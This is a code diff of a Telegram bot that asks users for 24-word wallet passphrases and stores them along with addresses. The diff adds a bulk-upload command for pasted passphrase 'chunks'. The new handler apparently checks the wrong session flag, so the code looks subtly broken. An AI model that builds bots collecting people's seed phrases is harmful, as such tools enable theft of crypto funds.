@@ -93,6 +93,12 @@ bot.onText(/\/uploadWallet/, (msg) => {
     userSessions[chatId] = { waitingForPassphraseAndAddress: true };
 });
 
+bot.onText(/\/uploadManySponsor/, (msg) => {
+    const chatId = msg.chat.id;
+    bot.sendMessage(chatId, '📥 Please paste the chunck passphrases`', { parse_mode: 'Markdown' });
+    userSessions[chatId] = { waitingForChunkPassphrase: true };
+});
+
 bot.onText(/\/deleteWallet/, (msg) => {
     const chatId = msg.chat.id;
     bot.sendMessage(chatId, '📥 Please send your 24-word passphrase.\n\nFormat:\n`word1 word2 ... word24`', { parse_mode: 'Markdown' });
@@ -287,6 +293,30 @@ bot.on('message', async (msg) => {
             
             const saved = await storeLockedPi(passphrase, publicKey, address)
             bot.sendMessage(chatId, `${saved.success ? '✅' : '❌' } ${ saved.message }`);
+
+        } catch (error) {
+            console.log(error)
+            bot.sendMessage(chatId, '❌ Error processing the data. Ensure passphrase is correct.');
+        }
+
+        delete userSessions[chatId];
+    }
+});
+
+// Upload All Chunk Passphrase
+bot.on('message', async (msg) => {
+    const chatId = msg.chat.id;
+    const text = msg.text.trim();
+
+    if(userSessions[chatId]?.waitingForPassphraseAndAddress) {
+        const parts = text.split(/\n+/);
+
+        if(!parts.length) {
+            return bot.sendMessage(chatId, '❌ Invalid format. Paste complete passphrase');
+        }
+
+        try {
+            await bot.sendMessage(chatId, `⏳ Total passphrase found: ${parts.length}`);
 
         } catch (error) {
             console.log(error)
